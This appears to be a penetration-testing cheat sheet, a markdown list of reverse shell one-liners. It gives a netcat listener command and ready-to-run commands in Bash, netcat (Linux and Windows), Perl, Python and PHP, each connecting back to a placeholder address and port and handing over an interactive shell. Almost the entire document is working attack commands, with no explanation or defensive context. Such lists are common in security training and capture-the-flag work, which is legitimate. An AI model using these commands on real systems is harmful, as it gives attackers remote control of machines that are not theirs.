# Reverse Shell

## Listner

---
> nc -nvlp $PORt

## Bash

---
> bash -i >& /dev/tcp/$IP/$PORT 0>&1

## Netcat

---
Linux
> nc -nv $IP $PORT -e /bin/bash

Windows
> nc.exe -nv $IP $PORT -e cmd

## Perl

---
> perl -e 'use Socket;$i="$IP";$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S ,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec(" /bin/bash -i");};'

## Python

---
> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

## PHP

---
> php -r '$sock=fsockopen("$IP",$PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
